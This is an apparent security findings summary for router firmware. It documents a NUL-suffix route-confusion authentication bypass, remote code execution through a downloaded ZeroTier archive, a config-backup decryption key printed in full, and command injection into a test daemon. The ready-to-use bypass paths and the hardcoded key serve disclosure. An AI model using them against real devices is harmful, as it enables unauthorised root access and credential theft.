# Findings Summary

## F01: Web Route-Confusion Auth Bypass

Protected routes can be reached without a valid session by appending a
percent-encoded NUL followed by a static-file extension:

```text
/<protected-route>%00.js
```

In the password-configured state, plain protected routes redirect to
`/login.html`, while the NUL-suffix route dispatches to the protected handler.

Confirmed impact:

- `/goform/zerotier%00.js` reaches root script execution.
- `/cgi-bin/DownloadCfg%00.js` downloads the protected config backup.
- `/cgi-bin/DownloadLog%00.js` downloads logs.
- `/goform/telnet%00.js` starts `telnetd`.
- `/goform/ate%00.js` starts manufacturing/ATE service.

## F02: ZeroTier Archive Execution RCE

The ZeroTier handler accepts a URL, downloads `zerotier.tar`, extracts it under
`/var/zerotier`, and executes `start_zerotier.sh`.

Validation:

```text
id=uid=0(root) gid=0(root) groups=0(root)
```

CVSS:

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
```

## F03: Config Backup Disclosure And Static-Key Decode

The downloaded config backup is:

```text
AES-128-ECB(
  "<md5(config.tgz)>\n" +
  "<product-id>\n" +
  config.tgz
)
```

Static key:

```text
4008dfec3c0e98c406b50f8749924008
```

Decoded archives include sensitive files such as:

```text
etc/config/wireless
etc/config/pub
etc/config/cwmp
etc/config/wireguard
etc/passwd
etc/shadow
```

## F04: WFA/Sigma Test Daemon Command Injection

The firmware starts WFA/Sigma test daemons from rc.d. Direct TLV frames to
`wfa_dut:8000` can inject shell metacharacters into command handlers.

Confirmed:

```text
stock wfa_dut:8000 + crafted TLV -> /tmp/direct_8000 created
```

See:

```text
docs/FINDING_R07_WFA_DUT_UNAUTH_RCE.md
docs/R07_WFA_COMMAND_INJECTION_POC.md
```
